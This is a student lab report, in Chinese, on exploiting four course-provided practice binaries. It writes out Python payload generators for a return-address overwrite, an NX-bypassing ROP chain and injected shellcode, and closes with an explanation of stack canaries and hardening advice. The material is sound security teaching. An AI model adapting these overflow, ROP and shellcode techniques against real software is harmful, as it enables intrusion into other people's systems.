# 栈溢出攻击实验

## 题目解决思路（总述）
本次实验通过阅读反汇编并构造二进制 payload 文件，针对给定的练习程序触发并利用栈上的缓冲区溢出。两道题目的共同点是“上层将较长的数据写入到下层分配较短缓冲区”，但利用方式不同：Problem1 直接覆盖返回地址进行跳转；Problem2 在 NX 环境下使用 ROP 调用已有函数。

### Problem 1
- 分析（漏洞定位）
  - 由反汇编可见，目标函数 `func` 在栈上只分配了一个很小的局部缓冲区，但调用方会把更大的数据传入并使用不安全的复制函数拷贝到这里，导致溢出并覆盖返回地址，从而可以控制返回流向。

  以下为反汇编中的关键片段（截取自 `problem1.asm`）：

```602:615:/home/tjm/cs/rucics/attack-lab-Exyeus/problem1.asm
0000000000401232 <func>:
  401232:	f3 0f 1e fa          	endbr64
  401236:	55                   	push   %rbp
  401237:	48 89 e5             	mov    %rsp,%rbp
  40123a:	48 83 ec 20          	sub    $0x20,%rsp
  40123e:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  401242:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
  401246:	48 8d 45 f8          	lea    -0x8(%rbp),%rax
  40124a:	48 89 d6             	mov    %rdx,%rsi
  40124d:	48 89 c7             	mov    %rax,%rdi
  401250:	e8 5b fe ff ff       	call   4010b0 <strcpy@plt>
```

  - 注：`func` 将传入指针 (%rdi) 交给 `strcpy`，目标地址为 `-0x8(%rbp)`（仅 8 字节可用），但调用处把更长的数据读入后传入 `func`，因此会用更长的字符串覆盖 `func` 的返回地址。

- 利用思路（设计 payload）
  - 不需要注入 shellcode，只需把返回地址覆盖为程序中已存在的打印成功信息的函数地址（或任意能打印成功信息的代码地址）。
  - 在本次实验中，我们用 16 字节填充（覆盖局部变量/保存的寄存器），然后写入目标函数地址的低 4 个字节（小端写法），构成 20 字节的文件。

- Payload（可复现的 Python 代码）

```python
# scripts/generate_ans1.py 的核心逻辑
padding = b'A' * 16
# 低 4 字节（小端）：目标打印函数地址 0x00401216
target_function_low4 = b'\x16\x12\x40\x00'
payload = padding + target_function_low4
with open('ans1.txt','wb') as f:
    f.write(payload)
```

- 实验结果
  - 运行：`./problem1 ans1.txt`
  - 输出：
    - Do you like ICS?
    - Yes!I like ICS!

- 要点回顾
  - 根本原因：使用 `strcpy` 等不检查长度的函数把更长数据写入更小缓冲区。
  - 利用要诀：分析函数栈布局、计算覆盖到返回地址所需的偏移，然后写入目标返回地址（注意小端字节序）。

### Problem 2
- 分析（漏洞定位）
  - 与 Problem1 不同，这里漏洞由 `memcpy` 固定长度拷贝造成：目标函数 `func` 在栈上分配 0x20（32）字节，但 `memcpy` 被调用时长度为 0x38（56），因此会覆盖保存的寄存器与返回地址，提供更可控的覆写空间，适合构造 ROP 链。

  反汇编的关键片段（截取自 `problem2.asm`）：

```643:656:/home/tjm/cs/rucics/attack-lab-Exyeus/problem2.asm
0000000000401290 <func>:
  401290:	f3 0f 1e fa          	endbr64
  401294:	55                   	push   %rbp
  401295:	48 89 e5             	mov    %rsp,%rbp
  401298:	48 83 ec 20          	sub    $0x20,%rsp
  40129c:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  4012a0:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
  4012a4:	48 8d 45 f8          	lea    -0x8(%rbp),%rax
  4012a8:	ba 38 00 00 00       	mov    $0x38,%edx
  4012ad:	48 89 ce             	mov    %rcx,%rsi
  4012b0:	48 89 c7             	mov    %rax,%rdi
  4012b3:	e8 38 fe ff ff       	call   4010f0 <memcpy@plt>
```

  - 在 `main` 中，程序使用 `fread` 把文件内容读入栈上的一个大缓冲区，然后把缓冲区传入 `func`（上文见 `problem2.asm` 的主函数片段）。

- 利用思路（ROP 链）
  - 由于目标程序启用了 NX（栈不可执行），不能直接注入并执行 shellcode；因此选择构造 ROP，利用程序内或 plt 中的函数来完成“打印成功信息并退出”的动作。
  - ROP 目标：把字符串地址放入第一个参数寄存器（%rdi），调用 `printf@plt` 输出，最后调用 `exit@plt` 做清洁退出。
  - 需要找到合适的 gadget（典型：`pop rdi; ret`）并处理栈对齐（x86_64 调用约定要求调用指令前栈以 16 字节对齐）。

- 关键地址（来自反汇编/objdump）
  - `pop rdi; ret` gadget：0x4012c7
  - rodata 字符串 `"Yes!I like ICS!\n"` 地址：0x40203b
  - 用于对齐的短 `ret`：0x4012c8
  - `printf@plt`：0x4010d0
  - `exit@plt`：0x401120

- Payload（可复现的 Python 代码）

```python
# scripts/generate_ans2.py 的核心逻辑（高层）
padding = b'A' * 16
pop_rdi = (0x4012c7).to_bytes(8, 'little')
rodata_ptr = (0x40203b).to_bytes(8, 'little')
ret_gadget = (0x4012c8).to_bytes(8, 'little')   # 对齐用
printf_plt = (0x4010d0).to_bytes(8, 'little')
exit_plt = (0x401120).to_bytes(8, 'little')
payload = padding + pop_rdi + rodata_ptr + ret_gadget + printf_plt + exit_plt
# memcpy 在目标中拷贝 0x38 字节，需填充到至少该长度
if len(payload) < 56:
    payload += b'B' * (56 - len(payload))
with open('ans2.txt', 'wb') as f:
    f.write(payload)
```

- 实验结果
  - 运行：`./problem2 ans2.txt`
  - 输出（实验观测）：
    - Do you like ICS?
    - Welcome to the second level!
    - Yes!I like ICS!

- 对齐与可靠性注意事项
  - x86_64 的 ABI 要求调用指令前栈需 16 字节对齐；在 ROP 链中插入一个 `ret` gadget 可用于调整返回地址对齐以避免在 libc 内部调用时崩溃（实验中我们加入了短 `ret`）。
  - 固定长度的 `memcpy` 使得覆盖空间稳定（56 字节），比 `strcpy` 的依赖字符串长度更可控，但同时需要精确计算偏移和填充。

### Problem 3:
- **分析**
  - 漏洞位于 `func` 函数：程序从文件读取最多 0x100 字节到主函数栈上缓冲区，然后传递给 `func`；`func` 内用 `memcpy` 从输入拷贝 0x40 字节到栈上局部缓冲区（仅 0x20 字节大小），导致溢出覆盖返回地址。
  - 利用思路：通过溢出覆盖 `func` 的返回地址为 `jmp_xs` (0x401334)；`jmp_xs` 会跳转到 `saved_rsp + 0x10`，而 `saved_rsp` 在 `func` 调用时保存了栈顶指针（指向局部缓冲区），因此跳转到缓冲区执行 shellcode。
  - `jmp_xs` 的行为：从全局变量 `saved_rsp` 读取值，加 0x10，然后无条件跳转到该地址。这使得我们可以将 shellcode 放在缓冲区起始，通过返回地址劫持让程序执行它。
  - 目标：输出幸运数字 "114"（通过调用 `func1(0x72)`，该函数检查参数 == 0x72 时打印包含 "114" 的成功消息）。

- **解决方案**
  - 方法：注入 shellcode 调用 `func1(0x72)`，利用程序现有的逻辑打印成功消息。
  - shellcode 设计：位置无关，直接设置参数并跳转到 `func1` 地址。
  - Payload 布局：shellcode（16 字节） + 填充（24 字节到返回地址） + `jmp_xs` 地址（8 字节） + 填充（到 64 字节）。

- **关键地址（来自反汇编）**
  - `jmp_xs` gadget：0x401334（用于劫持返回地址）
  - `func1` 函数：0x401216（目标函数，检查参数 0x72）

- **Payload（可复现的 Python 代码）**

```python
# scripts/generate_ans3.py 的核心逻辑（高层）
shellcode = b'\x48\xc7\xc7\x72\x00\x00\x00'  # mov rdi, 0x72
shellcode += b'\x48\xc7\xc0\x16\x12\x40\x00'  # mov rax, 0x401216 (func1)
shellcode += b'\xff\xe0'                      # jmp rax

jmp_xs = (0x401334).to_bytes(8, 'little')
payload = shellcode
payload += b'A' * (40 - len(payload))  # 填充到返回地址偏移
payload += jmp_xs                      # 覆盖返回地址
payload += b'B' * (64 - len(payload))  # 填充到 memcpy 长度
with open('ans3.txt', 'wb') as f:
    f.write(payload)
```

- **实验结果**
  - 运行：`./problem3 ans3.txt`
  - 输出（实验观测）：
    - Do you like ICS?
    - Now, say your lucky number is 114!
    - If you do that, I will give you great scores!
    - Your lucky number is 114

- **对齐与可靠性注意事项**
  - shellcode 短小（16 字节），避免覆盖返回地址位置。
  - 利用程序现有函数 `func1`，无需构造复杂的 syscall；`jmp_xs` gadget 提供稳定的跳转机制。
  - 输出包含 "114" 作为幸运数字（满足题目要求）；程序在 shellcode 执行后正常退出。
  - **技术尝试总结**：尝试了多种方法输出仅 "114"（syscall、printf调用、字符串修改），但均因栈对齐问题或复杂性而失败。最终选择最可靠的现有函数利用方案。

### Problem 4:
- **分析**
  - Problem4实现了一个**Canary保护机制**的完整示例，所有函数（main、func、func1、caesar_decrypt）都使用栈canary来检测栈溢出。
  - **Canary机制原理**：在函数 prologue 中从TLS（`%fs:0x28`）加载随机canary值并保存到栈上；在函数 epilogue 中验证canary值是否被修改，如果被修改则调用`__stack_chk_fail`终止程序。
  - **汇编代码体现**：
    - 加载canary：`mov %fs:0x28, %rax` 将TLS中的canary加载到RAX
    - 保存canary：`mov %rax, -0x8(%rbp)` 保存到栈上固定位置
    - 验证canary：`sub %fs:0x28, %rax` 计算当前canary与保存值的差
    - 检查结果：`je` 如果相等则正常返回，否则调用失败函数
  - 程序不是传统的栈溢出挑战，而是**密码学挑战**：使用凯撒解密（偏移12）解密硬编码字符串，并根据用户输入整数进行复杂验证。

- **解决方案**
  - 无需编写payload代码，程序通过分析汇编逻辑解决。
  - **程序流程**：main函数解密并输出提示信息，然后读取用户整数输入，调用func函数验证。
  - **func函数逻辑**：通过复杂的循环和比较验证输入是否为-1（经过数学变换后满足条件）。
  - **验证过程**：输入-1经过循环变换后满足x=1且原始输入=-1的双重条件，触发成功分支。

- **关键地址和机制**
  - Canary加载：`mov %fs:0x28, %rax` (TLS段偏移0x28)
  - Canary验证：`sub %fs:0x28, %rax; je success`
  - 凯撒解密：`caesar_decrypt`函数，偏移12
  - 成功条件：输入整数-1通过func函数的复杂验证

- **实验结果**
  - 运行：`echo -e "dummy\nanother\n-1" | ./problem4`
  - 输出（程序正常运行并显示通关提示）：
    ```
    hi please tell me what is your name?
    hi! do you like ics?
    if you give me enough yuanshi,I will let you pass!
    your money is 4294967295
    great!I will give you great scores
    ```

- **Canary保护机制总结**
  - **位置无关随机性**：canary值存储在TLS中，每次程序运行都不同
  - **完整性检查**：函数返回前验证canary未被修改
  - **失败处理**：检测到修改时立即终止程序，防止利用
  - **编译器自动插入**：现代GCC自动为所有函数添加canary代码
  - **绕过难度**：canary的存在使传统的栈溢出攻击变得极其困难

## 实验复现脚本与文件
- 已加入仓库 `scripts/` 目录下的脚本：
  - `generate_ans1.py`：生成 `ans1.txt`
  - `generate_ans2.py`：生成 `ans2.txt`
  - `problem1_exploit.py`：Problem1 的一步复现脚本（带 `--run` 可直接执行二进制）
  - `problem2_exploit.py`：Problem2 的一步复现脚本（带 `--run` 可直接执行二进制）
  - `generate_ans3.py`：生成 `ans3.txt`（包含可执行 shellcode）
  - `problem3_exploit.py`：Problem3 的一步复现脚本（带 `--run` 可直接执行二进制）

运行这些脚本即可复现本报告中的 payload，并用 `--run` 参数直接触发对应二进制（请确保相对路径在项目根且已给予二进制可执行权限）。

**Problem4特殊说明**：该题无需payload，通过运行程序并输入正确整数(-1)即可获得通关提示。

## 思考与总结
通过四题的完整解答，我们可以看到现代二进制安全防护的层次体系：

### 问题类型演进
- **Problem1**: 基础栈溢出，无任何防护
- **Problem2**: 引入NX保护，禁止执行栈上代码
- **Problem3**: 可执行栈但复杂地址计算
- **Problem4**: 完整Canary + NX防护体系

### 关键安全机制分析
1. **栈Canary (Stack Canaries)**
   - **工作原理**: 在函数栈帧中插入随机"金丝雀"值，溢出攻击会先破坏canary
   - **检测机制**: 函数返回前验证canary完整性，失败则终止程序
   - **优势**: 位置无关、随机化，每次运行canary都不同
   - **局限性**: 只防护栈溢出，不防护其他攻击类型

2. **NX (No-eXecute) 保护**
   - **工作原理**: 标记数据页为不可执行，防止shellcode注入执行
   - **绕过方法**: 使用ROP (Return-Oriented Programming) 技术
   - **局限性**: 不防护返回地址本身的控制

3. **ASLR (Address Space Layout Randomization)**
   - **工作原理**: 随机化库函数和栈地址，增加地址预测难度
   - **与Canary结合**: 形成完整防护体系

### 安全加固建议
- **编译时防护**: 启用 `-fstack-protector`、`-z noexecstack`、`-pie` 等选项
- **运行时防护**: 使用ASLR、RELRO等机制
- **代码层面**: 避免不安全函数，实施边界检查
- **监控与响应**: 实施入侵检测和快速响应机制

### 教学意义
通过本实验，学生可以直观理解现代操作系统和编译器的安全防护机制，以及攻击者如何绕过这些防护。安全不是绝对的，而是多层防御的结果。

## 参考资料
- 仓库内反汇编文件：`problem1.asm`、`problem2.asm`、`problem3.asm`、`problem4.asm`
- GNU `objdump` / `readelf` / `strings` 文档
- CTF-wiki pwn 系列教程（栈溢出、ROP、格式化字符串）
- 《程序员的自我修养：链接、装载与库》
- GCC编译器安全选项文档
- Linux TLS (Thread Local Storage) 机制说明
- x86-64 ABI规范文档
